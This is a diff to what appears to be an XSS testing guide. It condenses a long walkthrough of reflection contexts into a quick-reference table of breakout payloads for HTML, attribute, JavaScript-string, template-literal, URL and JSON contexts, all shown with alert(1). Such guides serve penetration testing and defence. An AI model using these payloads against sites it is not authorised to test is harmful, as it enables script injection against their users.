@@ -55,119 +55,21 @@ Before throwing payloads, map where input gets reflected:
 
 The fragment is important because it only processes client-side. SPAs frequently use fragment routing and client-side JS parses `location.hash` - that's a source for DOM XSS.
 
-### Distinguish reflection context
+### Reflection context quick reference
 
-The context determines which payload works:
+| Context | Example | Escape char | Payload |
+|---------|---------|-------------|---------|
+| HTML (between tags) | `<p>INJECT</p>` | none | `<img src=x onerror=alert(1)>` |
+| HTML attr, unquoted | `<input value=INJECT>` | space | `x onclick=alert(1)` |
+| HTML attr, single-quoted | `<input value='INJECT'>` | `'` | `'><script>alert(1)</script>` or `' onclick='alert(1)` |
+| HTML attr, double-quoted | `<input value="INJECT">` | `"` | `"><script>alert(1)</script>` or `" onclick="alert(1)` |
+| JS string, single-quoted | `var x = 'INJECT';` | `'` | `';alert(1)//` or `\';alert(1)//` if quotes are backslash-escaped |
+| JS string, double-quoted | `var x = "INJECT";` | `"` | `";alert(1)//` |
+| JS template literal | `` var x = `INJECT`; `` | none | `${alert(1)}` |
+| URL attribute | `<a href="INJECT">` | none needed | `javascript:alert(1)` |
+| JSON in script block | `var x = {"k":"INJECT"};` | `"` | `"}; alert(1); //` |
 
-**HTML context** - injected between tags
-```
-<p>Hello INJECT</p>
-```
-You're in raw HTML, just inject a tag directly:
-```
-<img src=x onerror=alert(1)>
-```
-`src=x` makes the image fail to load, which triggers `onerror`.
-
-**HTML attribute, unquoted**
-```
-<input value=INJECT>
-```
-No quotes to escape. Add a space to end the attribute value and open a new one:
-```
-x onclick=alert(1)
-```
-Result: `<input value=x onclick=alert(1)>` - fires when clicked.
-
-**HTML attribute, single-quoted**
-```
-<input value='INJECT'>
-```
-`'` closes the attribute, `>` closes the tag, then inject a new tag:
-```
-'><script>alert(1)</script>
-```
-Result: `<input value=''>` then `<script>alert(1)</script>` in raw HTML.
-
-Alternatively, stay inside the tag and add an event handler:
-```
-' onclick='alert(1)
-```
-Result: `<input value='' onclick='alert(1)'>` - fires on click.
-
-**HTML attribute, double-quoted**
-```
-<input value="INJECT">
-```
-Same idea, swap the quote character:
-```
-"><script>alert(1)</script>
-```
-Result: `<input value="">` then `<script>alert(1)</script>`.
-
-**JavaScript string, single-quoted**
-```javascript
-var name = 'INJECT';
-```
-`'` closes the string, `;` ends the statement, then write JS, then `//` comments out the rest of the original line:
-```
-';alert(1)//
-```
-Result: `var name = '';alert(1)//';`
-
-If the app escapes single quotes with a backslash, try `\'` - your backslash escapes the app's backslash, leaving the quote to close the string:
-```
-\';alert(1)//
-```
-
-**JavaScript string, double-quoted**
-```javascript
-var name = "INJECT";
-```
-Same pattern:
-```
-";alert(1)//
-```
-Result: `var name = "";alert(1)//"`;`
-
-**JavaScript string, template literal**
-```javascript
-var name = `INJECT`;
-```
-No need to break out. `${}` evaluates expressions inline:
-```
-${alert(1)}
-```
-Result: `` var name = `${alert(1)}`; `` - alert fires during string evaluation.
-
-**URL attribute** (href, src, action)
-```
-<a href="INJECT">
-```
-If you control the full value, the browser executes `javascript:` URIs on click:
-```
-javascript:alert(1)
-```
-Result: `<a href="javascript:alert(1)">` - fires when clicked.
-
-**JSON inside script block**
-```javascript
-var data = {"name": "INJECT"};
-```
-`"` closes the string, `}` closes the object, `;` ends the statement:
-```
-"}; alert(1); //
-```
-Result: `var data = {"name": ""}; alert(1); //};`
-
-**CSS**
-```
-color: INJECT;
-```
-```
-red; } body { background: url(javascript:alert(1))
-```
-Legacy browsers only (IE). Largely dead.
+For HTML attributes the pattern is always: escape quote -> close tag -> inject new tag, or escape quote -> add event handler and stay in tag. The only variable is which quote character to use.
 
 ### DOM XSS sources and sinks
 
